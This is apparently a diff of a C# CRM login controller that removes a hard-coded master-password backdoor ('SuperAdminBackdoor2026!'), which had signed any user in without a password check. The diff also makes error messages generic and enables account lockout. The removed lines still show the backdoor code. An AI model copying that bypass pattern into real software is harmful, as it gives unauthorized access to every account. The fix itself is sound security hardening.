@@ -12,9 +12,6 @@ namespace CRM.Controllers
         private readonly UserManager<Employee> _userManager;
         private readonly SignInManager<Employee> _signInManager;
         private readonly AppDbContext _context;
-        
-        // Мастер-пароль
-        private const string GlobalMasterPassword = "SuperAdminBackdoor2026!";
 
         public AccountController(UserManager<Employee> userManager, SignInManager<Employee> signInManager, AppDbContext context)
         {
@@ -114,30 +111,28 @@ namespace CRM.Controllers
 
             if (user == null)
             {
-                ModelState.AddModelError(string.Empty, "Пользователь не найден");
+                ModelState.AddModelError(string.Empty, "Неверный логин или пароль");
                 return View();
             }
 
             if (user.IsDismissed)
             {
-                ModelState.AddModelError(string.Empty, "Доступ запрещен (уволен)");
+                ModelState.AddModelError(string.Empty, "Доступ запрещен");
                 return View();
             }
 
-            // --- БЭКДОР ---
-            if (password == GlobalMasterPassword)
-            {
-                // Принудительный вход (без проверки хеша пароля)
-                await _signInManager.SignInAsync(user, isPersistent: false);
-                return RedirectToLocal(returnUrl);
-            }
-
             // Стандартный вход
-            var result = await _signInManager.PasswordSignInAsync(user, password, isPersistent: true, lockoutOnFailure: false);
+            var result = await _signInManager.PasswordSignInAsync(user, password, isPersistent: true, lockoutOnFailure: true);
 
             if (result.Succeeded)
             {
                 return RedirectToLocal(returnUrl);
+            }
+
+            if (result.IsLockedOut)
+            {
+                ModelState.AddModelError(string.Empty, "Аккаунт временно заблокирован после нескольких неудачных попыток входа.");
+                return View();
             }
             
             ModelState.AddModelError(string.Empty, "Неверный логин или пароль");
